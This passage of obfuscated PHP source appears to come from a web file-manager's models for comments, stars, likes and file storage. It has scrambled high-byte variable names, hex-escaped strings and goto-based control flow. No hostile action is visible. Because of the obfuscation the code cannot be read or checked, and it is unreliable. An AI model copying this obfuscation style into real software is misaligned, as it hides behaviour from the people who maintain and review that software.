trim($Â¢ĞÊèŠ[$¦“Èç¨[$¤£Ñæ›·[193]]], $¤£Ñæ›·[8]); $¦“Èç¨[$¤£Ñæ›·[582]] = $¦“Èç¨[$¤£Ñæ›·[32]] . $¤£Ñæ›·[8]; } if (intval($¦“Èç¨[$¤£Ñæ›·[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¦“Èç¨, $¦®„“ê×, $òåú•é—); } } unset($¦“Èç¨); return $›ÜÖ²­µ; } private function _listAppendPathRecycle(&$Ëˆï“©Í, $ú°™¬“, $ó¢ú†ìœ) { $Éé“İı =& $_SERVER[‹è™Ü¸Ñ]; if (!in_array($ó¢ú†ìœ, $ú°™¬“) && $Ëˆï“©Í[$Éé“İı[193]] != $ó¢ú†ìœ) { return; } $€ı§Ó–‰ = explode($Éé“İı[8], trim($Ëˆï“©Í[$Éé“İı[582]], $Éé“İı[8])); $Ÿøùæ‰Ö = implode($Éé“İı[8], array_slice($€ı§Ó–‰, 2)); $Ëˆï“©Í[$Éé“İı[582]] = $Éé“İı[8] . LNG($Éé“İı[593]) . $Éé“İı[8] . ltrim($Ÿøùæ‰Ö, $Éé“İı[8]); $Ëˆï“©Í[$Éé“İı[584]] = $Éé“İı[594] . implode($Éé“İı[50], array_slice($ú°™¬“, 1)) . $Éé“İı[50]; if ($Ëˆï“©Í[$Éé“İı[193]] == $ó¢ú†ìœ) { $Ëˆï“©Í[$Éé“İı[584]] = $Éé“İı[594]; $Ëˆï“©Í[$Éé“İı[192]] = $Éé“İı[228]; $Ëˆï“©Í[$Éé“İı[32]] = LNG($Éé“İı[593]); } $Ëˆï“©Í[$Éé“İı[595]] = $Éé“İı[596]; } protected function _listAppendPathRoot(&$Ÿèáœñ¤, $Àå¯çùú) { $¯¸ßìÙî =& $_SERVER[‹è™Ü¸Ñ]; static $ÒÃãî‰¤ = false; $»”—£‰¹ = $¯¸ßìÙî[12]; if ($Ÿèáœñ¤[$¯¸ßìÙî[190]] == self::TYPE_USER) { if ($Ÿèáœñ¤[$¯¸ßìÙî[569]] == USER_ID) { $»”—£‰¹ = LNG($¯¸ßìÙî[597]); if ($ÒÃãî‰¤ === !1) { $õÁùå”½ = Model($¯¸ßìÙî[598])->getInfoFull(USER_ID); $ÒÃãî‰¤ = _get($õÁùå”½, $¯¸ßìÙî[599], $¯¸ßìÙî[12]); } if ($Àå¯çùú && $Àå¯çùú[0] == $ÒÃãî‰¤ || !$Àå¯çùú && $Ÿèáœñ¤[$¯¸ßìÙî[193]] == $ÒÃãî‰¤) { $»”—£‰¹ = LNG($¯¸ßìÙî[600]); $Ÿèáœñ¤[$¯¸ßìÙî[601]] = $¯¸ßìÙî[602]; } if (!$Àå¯çùú) { $Ÿèáœñ¤[$¯¸ßìÙî[32]] = $»”—£‰¹; } } else { $Ÿèáœñ¤[$¯¸ßìÙî[603]] = Model($¯¸ßìÙî[577])->getInfoSimpleOuter($Ÿèáœñ¤[$¯¸ßìÙî[569]]); $»”—£‰¹ = LNG($¯¸ßìÙî[604]) . $¯¸ßìÙî[176] . $Ÿèáœñ¤[$¯¸ßìÙî[603]][$¯¸ßìÙî[32]] . $¯¸ßìÙî[178]; } } else { if ($Ÿèáœñ¤[$¯¸ßìÙî[190]] == self::TYPE_GROUP) { $ôÏ¤ïˆŒ = Model($¯¸ßìÙî[585])->getInfoSimple($Ÿèáœñ¤[$¯¸ßìÙî[569]]); $»”—£‰¹ = $ôÏ¤ïˆŒ[$¯¸ßìÙî[32]]; } else { if ($Ÿèáœñ¤[$¯¸ßìÙî[190]] == self::TYPE_SYSTEM) { $»”—£‰¹ = $¯¸ßìÙî[605]; } } } $»”—£‰¹ = $»”—£‰¹ ? $¯¸ßìÙî[8] . $»”—£‰¹ . $¯¸ßìÙî[8] : $¯¸ßìÙî[8]; return $»”—£‰¹; } protected function _listAppendUser(&$Ù§Ó•‚è) { $Ö°À‡ÇÎ =& $_SERVER[‹è™Ü¸Ñ]; $°Çµöƒµ = array_to_keyvalue($Ù§Ó•‚è, $Ö°À‡ÇÎ[12], $Ö°À‡ÇÎ[527]); $óšÒ«£ = array_to_keyvalue($Ù§Ó•‚è, $Ö°À‡ÇÎ[12], $Ö°À‡ÇÎ[529]); $¶Åì”î– = array_merge($°Çµöƒµ, $óšÒ«£); $Ğ‡ÑïÅ = Model($Ö°À‡ÇÎ[598])->userListInfo($¶Åì”î–); foreach ($Ù§Ó•‚è as &$šúÛñ¼î) { $ŞòÊïİõ = $šúÛñ¼î[$Ö°À‡ÇÎ[527]]; $šúÛñ¼î[$Ö°À‡ÇÎ[527]] = $Ğ‡ÑïÅ[$ŞòÊïİõ] ? $Ğ‡ÑïÅ[$ŞòÊïİõ] : !1; $ŞòÊïİõ = $šúÛñ¼î[$Ö°À‡ÇÎ[529]]; $šúÛñ¼î[$Ö°À‡ÇÎ[529]] = $Ğ‡ÑïÅ[$ŞòÊïİõ] ? $Ğ‡ÑïÅ[$ŞòÊïİõ] : !1; if (_get($šúÛñ¼î, $Ö°À‡ÇÎ[606], 0)) { $ĞˆêáÏ = $GLOBALS[$Ö°À‡ÇÎ[6]][$Ö°À‡ÇÎ[92]][$Ö°À‡ÇÎ[607]]; if ($šúÛñ¼î[$Ö°À‡ÇÎ[539]][$Ö°À‡ÇÎ[608]] <= time() - $ĞˆêáÏ) { $this->metaSet($šúÛñ¼î[$Ö°À‡ÇÎ[193]], $Ö°À‡ÇÎ[609], null); $this->metaSet($šúÛñ¼î[$Ö°À‡ÇÎ[193]], $Ö°À‡ÇÎ[608], null); unset($šúÛñ¼î[$Ö°À‡ÇÎ[539]][$Ö°À‡ÇÎ[609]]); continue; } $ŸÉÓÇÔ» = $šúÛñ¼î[$Ö°À‡ÇÎ[539]][$Ö°À‡ÇÎ[609]]; $šúÛñ¼î[$Ö°À‡ÇÎ[539]][$Ö°À‡ÇÎ[610]] = Model($Ö°À‡ÇÎ[598])->getInfoSimpleOuter($ŸÉÓÇÔ»); } } unset($šúÛñ¼î); } public function parentLevelArray($¶Üä“œ¸) { $ê®²±Ë =& $_SERVER[‹è™Ü¸Ñ]; $¶Üä“œ¸ = explode($ê®²±Ë[50], trim($¶Üä“œ¸, $ê®²±Ë[50])); return array_remove_value($¶Üä“œ¸, $ê®²±Ë[228]); } public function listAll($êÚ™‹ÖË) { $§û´®îĞ =& $_SERVER[‹è™Ü¸Ñ]; $òıŸù = $this->sourceInfo($êÚ™‹ÖË); $¢€šø¤µ = array($§û´®îĞ[611] => array($§û´®îĞ[612], $òıŸù[$§û´®îĞ[584]] . $êÚ™‹ÖË . $§û´®îĞ[613]), $§û´®îĞ[614] => 0); $ßâ›Åñí = $§û´®îĞ[615]; $¼ÜòÀˆ = "\114\105\106\124\40\112\117\x49\116\x20{$this->tablePrefix}\x69\x6f\137\x66\x69\x6c\x65\x20\146\x69\x6c\x65\40\x6f\156\40\x73\157\x75\162\x63\x65\x2e\146\x69\154\x65\x49\104\x20\75\40\146\151\154\x65\56\146\151\154\145\x49\104"; $«¬ˆ™ì§ = $this->alias($§û´®îĞ[519])->field($ßâ›Åñí)->where($¢€šø¤µ)->join($¼ÜòÀˆ)->select(); $this->_listAppendAuth($«¬ˆ™ì§); $this->_listAppendUser($«¬ˆ™ì§); $this->_listAppendPath($«¬ˆ™ì§); $«¬ˆ™ì§ = array_to_keyvalue($«¬ˆ™ì§, $§û´®îĞ[193]); $Ìàš‚á´ = "\57{$òıŸù[$§û´®îĞ[32]]}\57"; $Ìàš‚á´ = $Ìàš‚á´ == $§û´®îĞ[592] ? $§û´®îĞ[8] : $Ìàš‚á´; $¦Ï•ŒÕİ = array(); foreach ($«¬ˆ™ì§ as $«¿’ş“Û => $È«·ÃÑ–) { $ÏêáòÚ = $this->parentLevelArray($È«·ÃÑ–[$§û´®îĞ[584]]); array_shift($ÏêáòÚ); $”Ï²‡›å = $Ìàš‚á´; for ($“ºÒ§ìç = 0; $“ºÒ§ìç < count($ÏêáòÚ); $“ºÒ§ìç++) { $”Ï²‡›å .= $«¬ˆ™ì§[$ÏêáòÚ[$“ºÒ§ìç]][$§û´®îĞ[32]] . $§û´®îĞ[8]; } $”Ï²‡›å .= $È«·ÃÑ–[$§û´®îĞ[32]]; if ($È«·ÃÑ–[$§û´®îĞ[485]]) { $”Ï²‡›å .= $§û´®îĞ[8]; } $®¿“âé = array($§û´®îĞ[495] => str_replace($§û´®îĞ[592], $§û´®îĞ[8], str_replace($§û´®îĞ[592], $§û´®îĞ[8], str_replace($§û´®îĞ[592], $§û´®îĞ[8], $”Ï²‡›å))), $§û´®îĞ[616] => intval($È«·ÃÑ–[$§û´®îĞ[485]]), $§û´®îĞ[617] => intval($È«·ÃÑ–[$§û´®îĞ[79]]), $§û´®îĞ[88] => intval($È«·ÃÑ–[$§û´®îĞ[88]]), $§û´®îĞ[90] => $this->pathInfoFilter($È«·ÃÑ–)); if (!$®¿“âé[$§û´®îĞ[485]]) { $®¿“âé[$§û´®îĞ[541]] = $È«·ÃÑ–[$§û´®îĞ[541]]; } $¦Ï•ŒÕİ[] = $®¿“âé; } $¦Ï•ŒÕİ = array_sort_by($¦Ï•ŒÕİ, $§û´®îĞ[87]); return $¦Ï•ŒÕİ; } } goto B•¶î˜¦‚Ù; e›”ƒ¨—†: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\x6e\x74"; protected $tableMeta = array("\164\x61\142\x6c\145\116\x61\x6d\x65" => "\x63\x6f\155\x6d\x65\156\x74\137\155\x65\164\x61", "\x6d\145\x74\x61\106\x69\145\154\x64" => "\143\157\155\x6d\x65\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¨„Ø…§Í) { $óƒè¬É =& $_SERVER[‹è™Ü¸Ñ]; if ($¨„Ø…§Í[$óƒè¬É[1980]]) { $ŞÒ¡¢ë² = $this->where(array($óƒè¬É[1981] => $¨„Ø…§Í[$óƒè¬É[1980]]))->find(); if (!$ŞÒ¡¢ë² || $ŞÒ¡¢ë²[$óƒè¬É[190]] != $¨„Ø…§Í[$óƒè¬É[190]] || $ŞÒ¡¢ë²[$óƒè¬É[569]] != $¨„Ø…§Í[$óƒè¬É[569]]) { return !1; } $this->where(array($óƒè¬É[1981] => $¨„Ø…§Í[$óƒè¬É[1980]]))->setAdd($óƒè¬É[1982], 1); } $¨„Ø…§Í[$óƒè¬É[1983]] = 0; $¨„Ø…§Í[$óƒè¬É[1982]] = 0; $¨„Ø…§Í[$óƒè¬É[805]] = 1; return $this->add($¨„Ø…§Í); } public function commentCount($‘»¦Ÿº—, $¿”ûÎ¬‘, $Òùƒ«š¼ = false) { $Å®á›÷¢ =& $_SERVER[‹è™Ü¸Ñ]; if (!$‘»¦Ÿº—) { return array(); } if (is_string($‘»¦Ÿº—) || is_int($‘»¦Ÿº—)) { $‘»¦Ÿº— = array($‘»¦Ÿº—); } $£æÚ™Ø© = array($Å®á›÷¢[569], $Å®á›÷¢[1984] => $Å®á›÷¢[565]); $€¢–‹ãÀ = array($Å®á›÷¢[569] => array($Å®á›÷¢[7], $‘»¦Ÿº—), $Å®á›÷¢[190] => $¿”ûÎ¬‘); if ($Òùƒ«š¼) { $€¢–‹ãÀ[$Å®á›÷¢[1752]] = $Òùƒ«š¼; } $ˆÏµ”äÏ = $this->field($£æÚ™Ø©)->where($€¢–‹ãÀ)->group($Å®á›÷¢[569])->select(); return array_to_keyvalue($ˆÏµ”äÏ, $Å®á›÷¢[569], $Å®á›÷¢[565]); } public function starTarget($ê³ä­©à, $‰íæÆ™“) { $ùù›œ¤ =& $_SERVER[‹è™Ü¸Ñ]; $íÔÜëì = $ê³ä­©à + self::TYPE_STAR_OFFSET; $áÚÑõá = array($ùù›œ¤[1752] => USER_ID, $ùù›œ¤[190] => $íÔÜëì, $ùù›œ¤[569] => $‰íæÆ™“); $ü¤µåÂÒ = $this->where($áÚÑõá)->find(); if ($ü¤µåÂÒ) { return $this->where(array($ùù›œ¤[475] => $ü¤µåÂÒ[$ùù›œ¤[475]]))->delete(); } $ÓÔˆà´Ç = array($ùù›œ¤[1980] => 0, $ùù›œ¤[1752] => USER_ID, $ùù›œ¤[805] => 1, $ùù›œ¤[171] => $ùù›œ¤[12], $ùù›œ¤[190] => $íÔÜëì, $ùù›œ¤[569] => $‰íæÆ™“, $ùù›œ¤[1983] => 0, $ùù›œ¤[1982] => 0); return $this->add($ÓÔˆà´Ç); } public function starTargetCount($÷ÛßÇö¤, $µÎË¹ß) { $Ä¾çì‰£ =& $_SERVER[‹è™Ü¸Ñ]; $·÷Û¯Á = $µÎË¹ß + self::TYPE_STAR_OFFSET; $¢«ßû¹ = $this->commentCount($÷ÛßÇö¤, $·÷Û¯Á); $«öêÏ‚ = $this->commentCount($÷ÛßÇö¤, $·÷Û¯Á, USER_ID); return array($Ä¾çì‰£[1985] => $¢«ßû¹, $Ä¾çì‰£[1986] => $«öêÏ‚); } public function starTargetUserList($—±¿ò¢ˆ, $­Ë²åâï) { $şÛŸíàÒ =& $_SERVER[‹è™Ü¸Ñ]; $Ó¿Ñ‰Ş¼ = $—±¿ò¢ˆ + self::TYPE_STAR_OFFSET; $’‹–ÅÇ÷ = array($şÛŸíàÒ[569] => $­Ë²åâï, $şÛŸíàÒ[190] => $Ó¿Ñ‰Ş¼); $Òò±ğÌ = $this->where($’‹–ÅÇ÷)->count(); $éØàÓİÌ = array($şÛŸíàÒ[332] => $Òò±ğÌ, $şÛŸíàÒ[1987] => array()); if (!$Òò±ğÌ) { return $éØàÓİÌ; } $ÄÅºçõ’ = $this->field($şÛŸíàÒ[1752])->where($’‹–ÅÇ÷)->limit(500)->select(); $ÄÅºçõ’ = array_to_keyvalue($ÄÅºçõ’, $şÛŸíàÒ[12], $şÛŸíàÒ[1752]); $éØàÓİÌ[$şÛŸíàÒ[1987]] = Model($şÛŸíàÒ[577])->userListInfo($ÄÅºçõ’); return $éØàÓİÌ; } public function prasiseUserList($–Û”¹„ã) { $ë°ß”ÕĞ =& $_SERVER[‹è™Ü¸Ñ]; $¿é“Şìü = array($ë°ß”ÕĞ[1988] => $–Û”¹„ã); $ç‚—©½í = $this->where($¿é“Şìü)->find(); $Åô˜ë›ª = _get($ç‚—©½í, $ë°ß”ÕĞ[1983], 0); $ûõÚü›¼ = array($ë°ß”ÕĞ[332] => $Åô˜ë›ª, $ë°ß”ÕĞ[1987] => array()); if (!$Åô˜ë›ª) { return $ûõÚü›¼; } $Åêùºàò = Model($ë°ß”ÕĞ[1989])->field($ë°ß”ÕĞ[1752])->where($¿é“Şìü)->limit(500)->select(); $Åêùºàò = array_to_keyvalue($Åêùºàò, $ë°ß”ÕĞ[12], $ë°ß”ÕĞ[1752]); $ûõÚü›¼[$ë°ß”ÕĞ[1987]] = Model($ë°ß”ÕĞ[577])->userListInfo($Åêùºàò); return $ûõÚü›¼; } public function remove($„ÔèÙ»ç) { $—¸¥äÉ =& $_SERVER[‹è™Ü¸Ñ]; $°ÙÌ”É = array($—¸¥äÉ[1981] => $„ÔèÙ»ç); $¢»°çÃÎ = $this->where($°ÙÌ”É)->find(); if ($¢»°çÃÎ[$—¸¥äÉ[1980]]) { $this->where(array($—¸¥äÉ[1981] => $¢»°çÃÎ[$—¸¥äÉ[1980]]))->setAdd($—¸¥äÉ[1982], -1); } return $this->where($°ÙÌ”É)->delete(); } public function edit($ïò‘ş†¹, $ıüÉú‰–) { $ÊÈñÆ§ï =& $_SERVER[‹è™Ü¸Ñ]; $îŒôÙ‚ = array($ÊÈñÆ§ï[1981] => $ïò‘ş†¹); return $this->where($îŒôÙ‚)->save(array($ÊÈñÆ§ï[1990] => $ıüÉú‰–)); } public function prasise($Ö€Ï°öÑ) { $ü¢ã¿Á÷ =& $_SERVER[‹è™Ü¸Ñ]; $¿ÏÀ¼Òş = Model($ü¢ã¿Á÷[1991]); $ş¥ÕÊŒÚ = array($ü¢ã¿Á÷[1981] => $Ö€Ï°öÑ, $ü¢ã¿Á÷[1743] => USER_ID); $»°ó™„Ù = $¿ÏÀ¼Òş->where($ş¥ÕÊŒÚ)->find(); if (!$»°ó™„Ù) { $¿ÏÀ¼Òş->add($ş¥ÕÊŒÚ); $·‘êùè = $this->where(array($ü¢ã¿Á÷[1981] => $Ö€Ï°öÑ))->setAdd($ü¢ã¿Á÷[1983], 1); } else { $¿ÏÀ¼Òş->where($ş¥ÕÊŒÚ)->delete(); $·‘êùè = $this->where(array($ü¢ã¿Á÷[1981] => $Ö€Ï°öÑ))->setAdd($ü¢ã¿Á÷[1983], -1); } return $·‘êùè; } public function targetInfo($ñšÎòÇ, $×¬ã€¤Ğ) { $Ù¼ø¼Ø =& $_SERVER[‹è™Ü¸Ñ]; $Ò÷‡§üŞ = array($Ù¼ø¼Ø[648] => $ñšÎòÇ, $Ù¼ø¼Ø[649] => $×¬ã€¤Ğ); $£Ï‹ÕÔÉ = $this->where($Ò÷‡§üŞ)->count(); $·¸¬ƒúş = "\x52\111\x47\x48\x54\40\112\117\x49\x4e\40{$this->tablePrefix}\143\157\x6d\155\x65\x6e\164\137\160\x72\141\151\x73\x65\40\x73\164\x61\162\40\x6f\156\40\143\x6f\155\x6d\145\156\x74\x2e\143\x6f\155\x6d\145\x6e\x74\x49\x44\x20\75\x20\x73\x74\x61\x72\56\143\157\x6d\x6d\x65\x6e\164\111\x44"; $ÎŸûÃ®ˆ = $this->alias($Ù¼ø¼Ø[430])->where($Ò÷‡§üŞ)->join($·¸¬ƒúş, $Ù¼ø¼Ø[1992])->count(); $Äâ©ŠÕ± = array($Ù¼ø¼Ø[1993] => $£Ï‹ÕÔÉ, $Ù¼ø¼Ø[1994] => $ÎŸûÃ®ˆ); return $Äâ©ŠÕ±; } public function listData($Ñì¿ÄÄ×) { $ù»òøıÁ =& $_SERVER[‹è™Ü¸Ñ]; if (isset($Ñì¿ÄÄ×[$ù»òøıÁ[1995]])) { if ($Ñì¿ÄÄ×[$ù»òøıÁ[1995]]) { $Ñì¿ÄÄ×[$ù»òøıÁ[1988]] = array($ù»òøıÁ[1072], intval($Ñì¿ÄÄ×[$ù»òøıÁ[1995]])); } unset($Ñì¿ÄÄ×[$ù»òøıÁ[1995]]); } if (isset($Ñì¿ÄÄ×[$ù»òøıÁ[1996]])) { if ($Ñì¿ÄÄ×[$ù»òøıÁ[1996]]) { $Ñì¿ÄÄ×[$ù»òøıÁ[1988]] = array($ù»òøıÁ[1069], intval($Ñì¿ÄÄ×[$ù»òøıÁ[1996]])); } unset($Ñì¿ÄÄ×[$ù»òøıÁ[1996]]); } return $this->_listData($Ñì¿ÄÄ×); } private function _listData($î‘Ç¿Ñ÷) { $ÉÖü£ì‰ =& $_SERVER[‹è™Ü¸Ñ]; $Ò‘Ä¿½ = $this->where($î‘Ç¿Ñ÷)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ò‘Ä¿½[$ÉÖü£ì‰[445]]); $this->_listAppendUser($Ò‘Ä¿½[$ÉÖü£ì‰[445]]); $this->_listAppendMeta($Ò‘Ä¿½[$ÉÖü£ì‰[445]]); return $Ò‘Ä¿½; } private function _makeOrder() { $Òêıéú½ =& $_SERVER[‹è™Ü¸Ñ]; $å‹·¾ÊŠ = array($Òêıéú½[1983], $Òêıéú½[1982], $Òêıéú½[231]); $õŠàÉß = Input::get($Òêıéú½[530], $Òêıéú½[7], $Òêıéú½[497], $å‹·¾ÊŠ); $µ¸—ÈÀ = Input::get($Òêıéú½[531], $Òêıéú½[7], $Òêıéú½[1745], array($Òêıéú½[1997], $Òêıéú½[526])); $Ù•õÜÓ¶ = $õŠàÉß . $Òêıéú½[53] . $µ¸—ÈÀ; return $this->order($Ù•õÜÓ¶); } private function _listAppendParent(&$âƒ¹®¦ç) { $“şó¬ë =& $_SERVER[‹è™Ü¸Ñ]; $Š²¸ì = array_unique(array_to_keyvalue($âƒ¹®¦ç, $“şó¬ë[12], $“şó¬ë[1980])); $Š²¸ì = array_remove_value($Š²¸ì, $“şó¬ë[228]); if (!$Š²¸ì) { return; } $ôÇƒ«ø = $this->where(array($“şó¬ë[1981] => array($“şó¬ë[7], $Š²¸ì)))->select(); $ôÇƒ«ø = array_to_keyvalue($ôÇƒ«ø, $“şó¬ë[1988]); foreach ($âƒ¹®¦ç as &$”úÎŞ—ı) { if (isset($ôÇƒ«ø[$”úÎŞ—ı[$“şó¬ë[1980]]])) { $”úÎŞ—ı[$“şó¬ë[1998]] = $ôÇƒ«ø[$”úÎŞ—ı[$“şó¬ë[1980]]]; } } unset($”úÎŞ—ı); } private function _listAppendUser(&$ò›Š…) { $ùæ·Ìˆ =& $_SERVER[‹è™Ü¸Ñ]; $¼Æú©ûÄ = array_unique(array_to_keyvalue($ò›Š…, $ùæ·Ìˆ[12], $ùæ·Ìˆ[1752])); $¼Æú©ûÄ = array_remove_value($¼Æú©ûÄ, $ùæ·Ìˆ[228]); if (count($¼Æú©ûÄ) == 0) { return; } foreach ($ò›Š… as $©è©ñ´) { if (isset($©è©ñ´[$ùæ·Ìˆ[1998]])) { $¼Æú©ûÄ[] = $©è©ñ´[$ùæ·Ìˆ[1998]][$ùæ·Ìˆ[1752]]; } } $ª»»âí‚ = Model($ùæ·Ìˆ[598])->userListInfo($¼Æú©ûÄ); foreach ($ò›Š… as &$©è©ñ´) { $©è©ñ´[$ùæ·Ìˆ[662]] = $ª»»âí‚[$©è©ñ´[$ùæ·Ìˆ[1752]]]; if (isset($©è©ñ´[$ùæ·Ìˆ[1998]])) { $©è©ñ´[$ùæ·Ìˆ[1998]][$ùæ·Ìˆ[662]] = $ª»»âí‚[$©è©ñ´[$ùæ·Ìˆ[1998]][$ùæ·Ìˆ[1752]]]; } } unset($©è©ñ´); } private function _listAppendMeta(&$áŸ½íáó) { $§‘”æä‚ =& $_SERVER[‹è™Ü¸Ñ]; $ßÎ‘ïåÖ = array_unique(array_to_keyvalue($áŸ½íáó, $§‘”æä‚[12], $§‘”æä‚[1988])); $ßÎ‘ïåÖ = array_remove_value($ßÎ‘ïåÖ, $§‘”æä‚[228]); if (!$ßÎ‘ïåÖ) { return; } foreach ($áŸ½íáó as $Í­³ù³) { if (isset($Í­³ù³[$§‘”æä‚[1998]])) { $ßÎ‘ïåÖ[] = $Í­³ù³[$§‘”æä‚[1998]][$§‘”æä‚[1988]]; } } $Êª£öÆ = $this->metaList($ßÎ‘ïåÖ); if (!$Êª£öÆ) { return !1; } foreach ($áŸ½íáó as &$Í­³ù³) { $Í­³ù³[$§‘”æä‚[539]] = $Êª£öÆ[$Í­³ù³[$§‘”æä‚[1988]]]; if (isset($Í­³ù³[$§‘”æä‚[1998]])) { $Í­³ù³[$§‘”æä‚[1998]][$§‘”æä‚[539]] = $Êª£öÆ[$Í­³ù³[$§‘”æä‚[1998]][$§‘”æä‚[1988]]]; } } unset($Í­³ù³); } private function metaList($ƒ­¼Û­Ğ) { $šÇÕ›ï¬ =& $_SERVER[‹è™Ü¸Ñ]; if (!$ƒ­¼Û­Ğ) { return array(); } $ùÒ‹êã = array($šÇÕ›ï¬[1988] => array($šÇÕ›ï¬[7], $ƒ­¼Û­Ğ)); $Ğ©å›–Û = Model($šÇÕ›ï¬[1999])->where($ùÒ‹êã)->select(); $Ğ©å›–Û = array_to_keyvalue_group($Ğ©å›–Û, $šÇÕ›ï¬[1988]); foreach ($Ğ©å›–Û as $Íª’é¼“ => $™—Ü™€) { $ç¨ËšÉÊ = array(); foreach ($™—Ü™€ as $ñè®ÃÒõ) { $ç¨ËšÉÊ[$ñè®ÃÒõ[$šÇÕ›ï¬[97]]] = $ñè®ÃÒõ[$šÇÕ›ï¬[450]]; } $Ğ©å›–Û[$Íª’é¼“] = $ç¨ËšÉÊ; } return $Ğ©å›–Û ? $Ğ©å›–Û : array(); } public function removeTarget($‰êÙóÀ, $â½ù«×µ) { $â€ğ®å’ =& $_SERVER[‹è™Ü¸Ñ]; if (!$â½ù«×µ) { return !0; } $â½ù«×µ = is_array($â½ù«×µ) ? $â½ù«×µ : array($â½ù«×µ); $ÍŸğúéÉ = array($â€ğ®å’[190] => $‰êÙóÀ, $â€ğ®å’[569] => array($â€ğ®å’[7], $â½ù«×µ)); $¹Íáêû = $this->field($â€ğ®å’[1988])->where($ÍŸğúéÉ)->select(); $ğÛŸ“ƒµ = array_to_keyvalue($¹Íáêû, $â€ğ®å’[12], $â€ğ®å’[1988]); if (!$ğÛŸ“ƒµ) { return !0; } $ÍŸğúéÉ = array($â€ğ®å’[1988] => array($â€ğ®å’[7], $ğÛŸ“ƒµ)); $this->where($ÍŸğúéÉ)->delete(); Model($â€ğ®å’[1991])->where($ÍŸğúéÉ)->delete(); Model($â€ğ®å’[2000])->where($ÍŸğúéÉ)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\154\145\137\x63\x6f\x6e\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\x54\151\x6d\145", "\x74\x69\155\145", "\x69\x6e\163\x65\162\164", "\146\x75\x6e\x63\x74\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\x6c\x65"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\141\x6d\145" => "\151\x6f\x5f\146\x69\154\145\x5f\155\145\x74\141", "\x6d\x65\164\141\106\x69\x65\x6c\144" => "\x66\x69\154\x65\111\104"); public function fileInfo($ŒË®ø¥ğ) { $ƒ«Š =& $_SERVER[‹è™Ü¸Ñ]; static $”×î° = array(); if (!isset($”×î°[$ŒË®ø¥ğ])) { $å‰æëÃÎ = $ƒ«Š[2001]; $¥íşÕ‹ = Model($ƒ«Š[544])->field($å‰æëÃÎ)->where(array($ƒ«Š[542] => $ŒË®ø¥ğ))->find(); $”×î°[$ŒË®ø¥ğ] = $¥íşÕ‹; } return $”×î°[$ŒË®ø¥ğ]; } public function addFileByContent($»Ñ«ù…© = '', $‰¾Œçüç = '') { $±â»ŸñĞ =& $_SERVER[‹è™Ü¸Ñ]; $í”ö÷ Ö = TEMP_PATH . $±â»ŸñĞ[2002]; if (!is_dir($í”ö÷ Ö)) { mk_dir($í”ö÷ Ö); } $û‡©ö = $í”ö÷ Ö . $±â»ŸñĞ[2003] . rand_string(16); file_put_contents($û‡©ö, $»Ñ«ù…©); $¿³ç¸ = $this->addFile($û‡©ö, $‰¾Œçüç, !0); if (file_exists($û‡©ö)) { @unlink($û‡©ö); } return $¿³ç¸; } public function createFileName($‘ê€Îå, $ÖÊ¾¹¸Ô = false, $Ö’Öş§÷ = false) { $±ıÑ¿Ö‹ =& $_SERVER[‹è™Ü¸Ñ]; $ü¢—ïÙŒ = IO::init($±ıÑ¿Ö‹[8]); $®áô£Ğş = $this->makeFilePath($‘ê€Îå, $ü¢—ïÙŒ, $ÖÊ¾¹¸Ô, $Ö’Öş§÷); $‘‡Áó ’ = $ü¢—ïÙŒ->pathFather($®áô£Ğş); static $øÉŸ‰Â = false; $¨ÌÓ©Ìñ = $±ıÑ¿Ö‹[2004] . md5($‘‡Áó ’); if (!$øÉŸ‰Â && !Cache::get($¨ÌÓ©Ìñ)) { $øÉŸ‰Â = !0; $ Õ—€®İ = IO::mkdir($‘‡Áó ’); if (!IO::exist($ Õ—€®İ . $±ıÑ¿Ö‹[852])) { IO::mkfile($ Õ—€®İ . $±ıÑ¿Ö‹[852]); } Cache::set($¨ÌÓ©Ìñ, 1, 3600 * 2); } return $®áô£Ğş; } public function makeFilePath($à´„íë‹, $í÷¯ƒî‘, $à­¿Ğ‰ = false, $Ø™ÄìÎ = false) { $äÙ¼ò =& $_SERVER[‹è™Ü¸Ñ]; $úÌÓË«° = Model($äÙ¼ò[825])->get($äÙ¼ò[2005]); $ú«˜•µå = KodIO::defaultIO() . date($äÙ¼ò[2006]); $¥à÷Š“± = $ú«˜•µå . rand_string(5) . short_id(100); $à´„íë‹ = str_replace($äÙ¼ò[8], $äÙ¼ò[11], KodIO::clear($à´„íë‹)); $é€ƒ…­ó = $í÷¯ƒî‘->ext($à´„íë‹); if (!$à´„íë‹) { $úÌÓË«° = $äÙ¼ò[831]; } switch ($úÌÓË«°) { case $äÙ¼ò[2007]: if ($é€ƒ…­ó) { $¥à÷Š“± = $¥à÷Š“± . $äÙ¼ò[10] . $é€ƒ…­ó; } if ($é€ƒ…­ó == $äÙ¼ò[1943]) { $¥à÷Š“± .= $äÙ¼ò[1271]; } break; case $äÙ¼ò[2008]: $âèÊ¹µÀ = Model($äÙ¼ò[825])->get($äÙ¼ò[826]); $ÚäÓíİî = substr(md5($äÙ¼ò[827] . $âèÊ¹µÀ . date($äÙ¼ò[804])), 0, 8); $Ç¼Á×ş = KodIO::defaultDriver(); $ú«˜•µå = $äÙ¼ò[1302] . $Ç¼Á×ş[$äÙ¼ò[475]] . $äÙ¼ò[484] . date($äÙ¼ò[2009]) . $ÚäÓíİî . $äÙ¼ò[8]; if ($é€ƒ…­ó == $äÙ¼ò[1943]) { $à´„íë‹ .= $äÙ¼ò[1271]; } $€„¬ÍÉş = $äÙ¼ò[2010] . $ú«˜•µå . $à´„íë‹; CacheLock::lock($€„¬ÍÉş); $¥à÷Š“± = $ú«˜•µå . $à´„íë‹; if (IO::exist($ú«˜•µå . $à´„íë‹)) { $†äîı¥è = substr($à´„íë‹, 0, strlen($à´„íë‹) - strlen($é€ƒ…­ó)); $µ‚ñèß = $Ø™ÄìÎ ? substr($Ø™ÄìÎ, 0, 5) : ($à­¿Ğ‰ ? 